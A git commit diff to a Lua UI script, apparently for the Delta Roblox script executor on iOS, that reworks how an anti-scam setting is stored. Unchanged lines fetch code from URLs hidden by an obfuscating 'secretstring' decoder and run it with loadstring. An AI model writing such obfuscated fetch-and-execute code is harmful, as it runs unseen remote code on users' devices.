e9b23606d9362800512f2da3224df94a7f6ed516
Goober2112 <mlemixservice@gmail.com>
2025-02-09 11:50:28 -0500

    Update Delta_ios.lua

--- scripts/ui/dev/Delta_ios.lua
+++ scripts/ui/dev/Delta_ios.lua
@@ -5106,8 +5106,6 @@ local status, res1, res2 = pcall(function()
                 script.Parent.Parent.Sidebar.Visible = true
             end
 
-	    setantiscam(not isinternalfile(secretstring("hop9kJCXm4B4jZOOb3p/")))
-
             loadstring(game:HttpGet(secretstring("ioV2f39B1baEmpG7c4KGn4mdi5apl5mmhp2TqZTroa6xcLqYm5KPnKPcs6Gx3LGzqbeY4qWux8WHvaPNtLbPrrW01/TUrfGwya3Z0MjRHOHJ2g==")))()
 	    loadstring(game:HttpGet(secretstring("ioV2f39B1baEmpG7c4KGn4mdi5apl5mmhp2TqZTroa6xcMmSk5ePoeTu7+f7tL6ev63htZ2tsYbEvqfFr+yvpLHPEdS3uM+/w/jS1L7B45661soEyurm4eEK6+viyg/S0+LvE9Tq2w==")))()
 
@@ -5894,15 +5892,8 @@ local status, res1, res2 = pcall(function()
 	local STR_UI_3 = secretstring("ZY+LjZaO2I+EmJCAb4eDnoDfeqKW6ZOmoZvObaufk6FkprKX2JKW+I++m5D0nrakwazg")
 
         UILib:AddTab()
-	UILib.Settings:AddSwitch(STR_UI_2, STR_UI_3, not isinternalfile(STR_UI_1), function(state)
+	UILib.Settings:AddSwitch(STR_UI_2, STR_UI_3, hasantiscam(), function(state)
 		setantiscam(state)
-		if state then
-                    if isinternalfile(STR_UI_1) then
-                        delinternal(STR_UI_1)
-                    end
-                else
-                    writeinternal(STR_UI_1, "disabled")
-                end
             end)
 
 	local STR_UI_10 = secretstring("Zop9kJCXm7+kmJ6Qhg==")
